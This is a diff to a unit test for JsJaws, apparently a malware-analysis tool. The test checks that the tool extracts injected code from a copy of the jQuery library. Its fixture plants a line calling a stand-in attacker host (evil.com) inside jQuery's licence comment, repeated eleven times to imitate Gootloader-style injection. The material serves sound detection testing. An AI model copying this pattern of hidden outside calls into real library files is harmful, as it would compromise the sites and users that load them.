@@ -713,15 +713,16 @@ class TestJsJaws:
 
     @staticmethod
     def test_extract_filtered_code(jsjaws_class_instance, dummy_get_response_class, mocker):
+        # Note that this is usually for Gootloader, and they always have more than 10 lines of evil code
         evil_string = "XMLHttpRequest('http://evil.com');\n"
         fake_response_text = "/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */"
         mocker.patch("jsjaws.get", return_value=dummy_get_response_class(fake_response_text))
-        file_contents = f"/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n{evil_string} * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */".encode()
+        file_contents = f"/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n{evil_string*11} * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */".encode()
         jsjaws_class_instance.artifact_list = []
         file_path, new_file_contents, lib_path = jsjaws_class_instance._extract_filtered_code(file_contents)
 
         assert path.exists(file_path)
-        assert new_file_contents == evil_string.encode()
+        assert new_file_contents == evil_string.encode() * 11
         assert lib_path == "https://code.jquery.com/jquery-1.11.3.js"
         remove(file_path)
 
